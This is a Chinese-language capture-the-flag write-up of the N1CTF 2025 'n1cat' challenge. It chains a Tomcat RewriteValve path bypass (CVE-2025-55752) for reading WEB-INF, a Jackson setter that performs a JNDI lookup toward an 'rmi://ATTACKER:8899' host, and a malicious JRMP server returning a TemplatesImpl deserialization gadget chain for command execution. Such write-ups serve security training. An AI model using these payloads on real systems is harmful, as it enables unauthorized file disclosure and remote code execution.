# N1CTF 2025 n1cat

## 题目简述

题目运行在 Tomcat 9.0.108 上，并启用了 RewriteValve：

```apache
RewriteCond %{QUERY_STRING} (^|&)path=([^&]+)
RewriteRule ^/download$ /%2 [B,L]
```

该版本受 CVE-2025-55752 影响。重写后的路径在安全检查与 URL 解码之间存在顺序问题，攻击者可以把查询参数中的内容重写到请求路径，绕过 Tomcat 对 `/WEB-INF` 的直接访问限制。读取应用源码后还能发现另一个入口：JSON 反序列化会调用 `User.setUrl()`，而该 setter 内部执行 JNDI lookup。于是完整链路是“Tomcat 路径绕过读取源码和依赖—Jackson bean setter 触发 JNDI—恶意 RMI 响应携带反序列化利用链”。

## 解题过程

先利用 RewriteValve 规则访问受保护资源。普通请求 `/WEB-INF/web.xml` 会被容器拒绝，但 `/download?path=...` 会把参数捕获组放入新路径。让斜杠在重写阶段仍保持为 `%2f`，可使用：

```text
/download?path=..%2fWEB-INF%2fweb.xml
```

Tomcat 先对 `/..%2fWEB-INF%2fweb.xml` 做规范化，此时编码斜杠还不是路径分隔符，`..` 没有被按预期消除；随后 `%2f` 被解码，实际资源路径才变为 `/../WEB-INF/web.xml` 并落到受保护目录。请求库或代理不能提前把 `%2f` 解码，否则到达 Tomcat 时就不再是漏洞所需形态。实战时应按同样方式逐步读取：

```text
/WEB-INF/web.xml
/WEB-INF/classes/ctf/n1cat/welcomeServlet.class
/WEB-INF/classes/ctf/n1cat/User.class
/WEB-INF/lib/*.jar
```

Tomcat 官方安全页说明 9.0.0.M11 至 9.0.108 受此问题影响，9.0.109 修复；漏洞成立的前提之一正是启用了 URL rewrite，详见 [Tomcat 9 安全公告](https://tomcat.apache.org/security-9)。外部公告的关键结论已体现在本题利用中：查询字符串经 rewrite 进入路径时，编码处理顺序可能使规范化检查看到的路径与最终访问路径不同。

对读出的 class 文件反编译，可以还原两段决定性逻辑。Servlet 从请求参数中取出 JSON，再交给 Jackson：

```java
User user = objectMapper.readValue(json, User.class);
```

`User` 的 URL setter 则直接访问 JNDI：

```java
public void setUrl(String url) throws NamingException {
    new InitialContext().lookup(url);
}
```

因此提交包含攻击者地址的 JSON，Jackson 在填充 bean 属性时就会调用 `setUrl()`。Servlet 也支持分别传入 `name`、`word`、`url` 并自行拼成 JSON，最简触发请求为：

```text
/?name=guest&word=welcome&url=rmi%3A%2F%2FATTACKER%3A8899%2Fx
```

这里不能沿用旧式“RMI 注册中心返回远程 codebase 类”的打法：目标是 JDK 17，远程类加载默认受到限制。官方解法改为自己实现 JRMP/RMI 协议服务端，在 registry lookup 的返回值里直接写入一个目标依赖可反序列化的对象图。

官方 `evilServer.java` 监听 8899 端口，识别 RMI transport 的 magic、版本和 lookup 调用，然后把 `PayloadGenerator.getPayload()` 返回的对象写入响应。对象链结构为：

```text
EventListenerList
  -> UndoManager.edits
    -> POJONode
      -> Spring AOP 动态代理（实现 Templates）
        -> TemplatesImpl
          -> 恶意字节码
```

反序列化 `EventListenerList` 时会沿对象图触发字符串化/方法调用，`POJONode` 经 Spring AOP 代理访问 `TemplatesImpl`，最终加载 `_bytecodes` 中的恶意 translet。官方 PoC 用 `touch /tmp/success` 证明命令执行；比赛环境中应将命令替换为读取 flag 或把 flag 写入 Web 可访问位置。

JDK 17 的模块封装和 Jackson 自带的序列化替换还会妨碍载荷构造。官方生成器先用 Javassist 移除 `BaseJsonNode.writeReplace()`，再通过 `Unsafe` 调整模块可见性，并要求启动攻击端 JVM 时加入相应的 `--add-opens` 参数。也就是说，下面两点缺一不可：

```text
1. 攻击者的 RMI 服务端必须真正返回序列化对象，而不是只给一个远程类地址；
2. 生成对象图时要处理 JDK 17 模块访问限制及 BaseJsonNode.writeReplace。
```

完整复现顺序如下：

```text
1. 借 /download 的 rewrite 编码绕过读取 web.xml、class 与依赖 jar
2. 反编译确认 User.setUrl() 中存在 InitialContext.lookup(url)
3. 按目标依赖启动官方恶意 RMI/JRMP 服务端，监听 8899
4. 向应用提交 url=rmi://ATTACKER:8899/x 的 User JSON
5. 目标 lookup 后反序列化恶意返回值，TemplatesImpl 执行命令
6. 从命令输出位置读取 flag
```

## 方法总结

本题不是单独利用 Tomcat 文件读取就能结束。CVE-2025-55752 的价值是突破 `/WEB-INF`，把原本不可见的 servlet、bean 以及依赖版本变成可审计证据；真正的代码执行来自 bean setter 中的 JNDI lookup 和客户端对 RMI 返回值的反序列化。判断题目类别时，决定性障碍仍是 Web 请求路径、JNDI 入口和 Java Web 依赖链的组合，因此归入 Web。

遇到类似题目，应先用读取能力建立精确的依赖清单，再选择与目标 JDK 和库版本匹配的 gadget。盲目套用旧 JNDI 远程类加载 PoC 在 JDK 17 上通常不会成功；本题官方实现恶意 JRMP 服务端，正是为了把攻击方式转换为“现有类路径上的反序列化利用”。
